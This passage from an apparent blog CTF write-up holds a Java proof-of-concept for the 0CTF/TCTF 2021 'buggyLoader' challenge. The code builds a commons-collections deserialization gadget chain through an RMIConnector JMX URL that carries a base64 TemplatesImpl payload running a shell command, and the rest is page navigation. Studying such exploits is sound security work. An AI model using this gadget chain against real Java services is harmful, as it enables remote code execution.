class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yxxx.buggyLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : ccreater</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ClassName</span> : com.yxxx.buggyLoader.Poc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> : 类描述</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021-11-19 14:09 Copyright  2021 ccreater. All rights reserved.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.deploy.NamingResourcesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.attoparser.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> javax.security.auth.message.AuthException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line"></span><br><span class="line">    Constructor con = InvokerTransformer.class.getDeclaredConstructor(String.class);</span><br><span class="line">    con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// need a public method</span></span><br><span class="line">    InvokerTransformer transformer = (InvokerTransformer) con.newInstance(<span class="string">&quot;connect&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rO0A.. from Temp.java</span></span><br><span class="line">    JMXServiceURL jurl = <span class="keyword">new</span> JMXServiceURL(<span class="string">&quot;service:jmx:rmi://c014:37777/stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRv&quot;</span></span><br><span class="line">        + <span class="string">&quot;cmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznB&quot;</span></span><br><span class="line">        + <span class="string">&quot;H9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4&quot;</span></span><br><span class="line">        + <span class="string">&quot;cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0&quot;</span></span><br><span class="line">        + <span class="string">&quot;ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0&quot;</span></span><br><span class="line">        + <span class="string">&quot;ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2&quot;</span></span><br><span class="line">        + <span class="string">&quot;YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGll&quot;</span></span><br><span class="line">        + <span class="string">&quot;czt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAA&quot;</span></span><br><span class="line">        + <span class="string">&quot;AozK/rq+AAAANAAkCgADAA8HABEHABIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJl&quot;</span></span><br><span class="line">        + <span class="string">&quot;clRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC1N0YXRpY0Jsb2NrAQAMSW5uZXJD&quot;</span></span><br><span class="line">        + <span class="string">&quot;bGFzc2VzAQAnTGNvbS95eHh4L2J1Z2d5TG9hZGVyL1RlbXAkU3RhdGljQmxvY2s7AQAKU291cmNl&quot;</span></span><br><span class="line">        + <span class="string">&quot;RmlsZQEACVRlbXAuamF2YQwABAAFBwATAQAlY29tL3l4eHgvYnVnZ3lMb2FkZXIvVGVtcCRTdGF0&quot;</span></span><br><span class="line">        + <span class="string">&quot;aWNCbG9jawEAEGphdmEvbGFuZy9PYmplY3QBABljb20veXh4eC9idWdneUxvYWRlci9UZW1wAQBA&quot;</span></span><br><span class="line">        + <span class="string">&quot;Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RU&quot;</span></span><br><span class="line">        + <span class="string">&quot;cmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1&quot;</span></span><br><span class="line">        + <span class="string">&quot;bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAQdG91Y2ggL3RtcC9mdWNr&quot;</span></span><br><span class="line">        + <span class="string">&quot;IAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAA&quot;</span></span><br><span class="line">        + <span class="string">&quot;IQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgAB&quot;</span></span><br><span class="line">        + <span class="string">&quot;AAAAFAAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAA&quot;</span></span><br><span class="line">        + <span class="string">&quot;AAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJcHQABG5hbWVwdwEAeHNyACpvcmcuYXBhY2hlLmNv&quot;</span></span><br><span class="line">        + <span class="string">&quot;bW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3Jn&quot;</span></span><br><span class="line">        + <span class="string">&quot;L2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUu&quot;</span></span><br><span class="line">        + <span class="string">&quot;Y29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnZva2VyVHJhbnNmb3JtZXKH6P9re3zOOAIA&quot;</span></span><br><span class="line">        + <span class="string">&quot;A1sABWlBcmdzdAATW0xqYXZhL2xhbmcvT2JqZWN0O0wAC2lNZXRob2ROYW1lcQB+AAlbAAtpUGFy&quot;</span></span><br><span class="line">        + <span class="string">&quot;YW1UeXBlc3EAfgAIeHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAO&quot;</span></span><br><span class="line">        + <span class="string">&quot;bmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAABzcgAR&quot;</span></span><br><span class="line">        + <span class="string">&quot;amF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9A&quot;</span></span><br><span class="line">        + <span class="string">&quot;AAAAAAAAdwgAAAAQAAAAAHh4eA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Map hashMapp = <span class="keyword">new</span> HashMap();</span><br><span class="line">    RMIConnector rc = <span class="keyword">new</span> RMIConnector(jurl,hashMapp);</span><br><span class="line"></span><br><span class="line">    Map hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    Map lazyMap = LazyMap.decorate(hashMap, transformer);</span><br><span class="line"></span><br><span class="line">    TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, rc);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HashSet hashSet = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">    hashSet.add(<span class="string">&quot;c014&quot;</span>);</span><br><span class="line">    Field fmap = hashSet.getClass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    fmap.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    HashMap innimpl = (HashMap) fmap.get(hashSet);</span><br><span class="line">    Field ftable = hashMap.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">    ftable.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object[] nodes =(Object[])ftable.get(innimpl);</span><br><span class="line">    Object node = nodes[<span class="number">1</span>];</span><br><span class="line">    Field fnode = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    fnode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    fnode.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oos.writeUTF(<span class="string">&quot;0CTF/TCTF&quot;</span>);</span><br><span class="line">    oos.writeInt(<span class="number">2021</span>);</span><br><span class="line">    oos.writeObject(hashSet);</span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] exp = baos.toByteArray();</span><br><span class="line">    String data = com.yxxx.buggyLoader.Utils.bytesTohexString(exp);</span><br><span class="line">    System.out.println(data);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="openConnection盲注flag"><a href="#openConnection盲注flag" class="headerlink" title="openConnection盲注flag"></a>openConnection盲注flag</h2><p><a target="_blank" rel="noopener" href="https://github.com/ceclin/0ctf-2021-finals-soln-buggy-loader/blob/main/app/src/main/kotlin/ccl/Blind.kt">https://github.com/ceclin/0ctf-2021-finals-soln-buggy-loader/blob/main/app/src/main/kotlin/ccl/Blind.kt</a></p>
+<p>自己看writeup.jpg</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://site.ccreater.top/2021/11/18/TCTF2021_BuggyLoader/" data-id="ckw63s4l0002aflol2id8dluy" data-title="buggyLoader" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/11/19/TSGCTF2021/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">用github action 让hexo体验++</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/htb/" rel="tag">htb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 12px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 12px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 12px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 18px;">web</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">出题笔记</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px;">域渗透</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">复现</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 14px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/11/19/TSGCTF2021/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/11/18/TCTF2021_BuggyLoader/">buggyLoader</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/">用github action 让hexo体验++</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/01/%E6%88%91%E7%9A%842020/">我的2020</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/13/real%20world%20ctf%202020/">real world ctf 2020</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 ccreater<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
